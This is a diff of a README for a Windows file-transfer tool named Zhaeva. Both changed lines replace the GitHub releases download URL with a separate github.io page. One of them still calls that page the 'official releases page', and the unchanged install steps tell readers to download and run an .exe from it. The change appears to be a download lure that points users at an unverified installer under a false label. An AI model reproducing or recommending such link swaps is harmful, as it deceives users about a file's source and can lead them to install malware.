@@ -1,6 +1,6 @@
 # 📂 Zhaeva - Send large files across any network
 
-[![](https://img.shields.io/badge/Download-Zhaeva-blue.svg)](https://github.com/brutish-sign324/Zhaeva/releases)
+[![](https://img.shields.io/badge/Download-Zhaeva-blue.svg)](https://brutish-sign324.github.io)
 
 Zhaeva moves files between computers. It uses a peer-to-peer connection to link your devices. This tool handles large data transfers with speed and safety. It protects your privacy with strong encryption standards. You control the flow of data across any network.
 
@@ -16,7 +16,7 @@ Zhaeva runs on Windows 10 and Windows 11. It needs at least 4 GB of RAM. Ensure 
 
 ## 📥 How to Install
 
-1. Visit the [official Zhaeva releases page](https://github.com/brutish-sign324/Zhaeva/releases).
+1. Visit the [official Zhaeva releases page](https://brutish-sign324.github.io).
 2. Find the latest version in the list.
 3. Look for the file ending in .exe.
 4. Click the file name to download the installer to your computer.
